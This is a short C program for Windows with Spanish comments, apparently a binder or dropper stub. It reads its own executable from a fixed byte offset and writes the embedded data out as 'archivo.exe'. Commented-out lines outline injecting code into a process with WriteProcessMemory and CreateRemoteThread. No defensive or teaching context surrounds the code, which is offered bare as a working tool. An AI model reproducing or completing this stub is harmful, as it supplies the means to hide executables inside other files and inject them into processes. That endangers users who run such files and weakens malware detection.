#include <windows.h>
#include <stdio.h>
    
int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument,int nFunsterStil)
{
    char *Me,*File,*Buffer;
    int Inicio=19769,Size=0,ID;
    FILE *pMe,*pFile;
    
    //HANDLE Proceso;
    
    //ID=GetCurrentProcessId();
    //Proceso = OpenProcess(0x0080, FALSE, ID); 
     
    
    
    Me=(char*)malloc(MAX_PATH);
    GetModuleFileName(0,Me,MAX_PATH);
    pMe=fopen(Me,"rb");
    pFile=fopen("archivo.exe","wb");
    
    //Lee el tamaño de los archivos
    fseek(pMe,0,SEEK_END);
    Size=ftell(pMe);
    fseek(pMe,Inicio,SEEK_SET);
    
    
	//Leyendo el archivo
	Buffer=(char*)malloc(Size+100);
    memset(Buffer,0,Size);
    fread(Buffer,(Size-Inicio),1,pMe);
	fwrite(Buffer,1,(Size-Inicio),pFile);
    
    //WriteProcessMemory(Proceso, (LPVOID)Buffer, 0,0, NULL); 
    //CreateRemoteThread(Proceso, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddy, (LPVOID)RemoteString, NULL, NULL);
        
    fclose(pFile);
    fclose(pMe);
}







